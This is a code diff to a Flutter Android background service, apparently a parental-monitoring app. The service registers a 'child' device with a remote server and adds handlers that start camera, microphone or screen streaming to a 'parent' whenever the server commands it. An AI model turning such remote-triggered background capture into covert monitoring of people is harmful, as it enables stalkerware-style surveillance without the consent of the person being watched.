@@ -3,6 +3,7 @@ import 'package:flutter_background_service/flutter_background_service.dart';
 import 'package:permission_handler/permission_handler.dart';
 import 'package:socket_io_client/socket_io_client.dart' as IO;
 import 'package:device_info_plus/device_info_plus.dart';
+import 'stream_service.dart';
 import 'dart:ui';
 
 const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';
@@ -38,8 +39,9 @@ void onStart(ServiceInstance instance) async {
   final deviceId = androidInfo.id;
   final deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';
 
-  // ✅ Retry automatique pour gérer le délai Render (5 min)
   IO.Socket? socket;
+  StreamService? streamService;
+
   void connect() {
     socket?.dispose();
     socket = IO.io(SERVER_URL, <String, dynamic>{
@@ -49,12 +51,33 @@ void onStart(ServiceInstance instance) async {
       'reconnectionDelay': 5000,
       'reconnectionAttempts': 999,
     });
+
     socket!.on('connect', (_) {
-      print('✅ Connecté à ORIA Server');
+      print('✅ Connecté');
       socket!.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
     });
-    socket!.on('execute_command', (action) => print('📡 Commande: $action'));
-    socket!.on('connect_error', (_) => print('⏳ En attente du serveur...'));
+
+    socket!.on('execute_command', (action) async {
+      print('📡 Commande: $action');
+      if (action == 'start_camera') {
+        streamService?.stop();
+        streamService = StreamService(socket!, 'parent');
+        await streamService!.startCamera();
+      } else if (action == 'start_mic') {
+        streamService?.stop();
+        streamService = StreamService(socket!, 'parent');
+        await streamService!.startMic();
+      } else if (action == 'start_screen') {
+        streamService?.stop();
+        streamService = StreamService(socket!, 'parent');
+        await streamService!.startScreen();
+      } else if (action == 'stop_stream') {
+        streamService?.stop();
+      }
+    });
+
+    socket!.on('signal', (data) => streamService?.handleSignal(data));
+    socket!.on('connect_error', (_) => print('⏳ En attente...'));
   }
   connect();
 }
